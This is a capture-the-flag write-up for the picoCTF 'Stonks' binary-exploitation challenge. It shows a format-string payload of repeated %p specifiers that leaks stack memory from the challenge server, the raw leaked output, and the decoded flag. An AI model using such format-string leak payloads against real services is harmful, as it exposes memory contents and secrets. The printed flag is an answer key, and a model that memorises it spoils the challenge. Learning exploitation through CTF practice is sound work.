# Stonks

## FLAG: picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}

## STATUS: Complete

Category: Binary-Exploit

Description: I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 27912

Hint-1: Okay, maybe I'd believe you if you find my API key.

> wget "https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c"

pass the program %p to get a valid pointer - so no sanitization of user input

if we pass the program a ton of %s%s%s%s%s%s%s we can see the overflow error / core dump

1
%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p

## Output

0x97643b0__0x804b000__0x80489c3__0xf7efdd80__0xffffffff__0x1__0x9762160__0xf7f0b110__0xf7efddc7__(nil)__0x9763180__0x2__0x9764390__0x97643b0__0x6f636970__0x7b465443__0x306c5f49__0x345f7435__0x6d5f6c6c__0x306d5f79__0x5f79336e__0x32666331__0x30613130__0xff9a007d__0xf7f38af8__0xf7f0b440__0x2753b500__0x1

Then run buffer.py to use the output to decode the bytes. - This results in:

b"picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}\x00\x9a\xff\xf8\x8a\xf3\xf7@\xb4\xf0\xf7\x00\xb5S'"
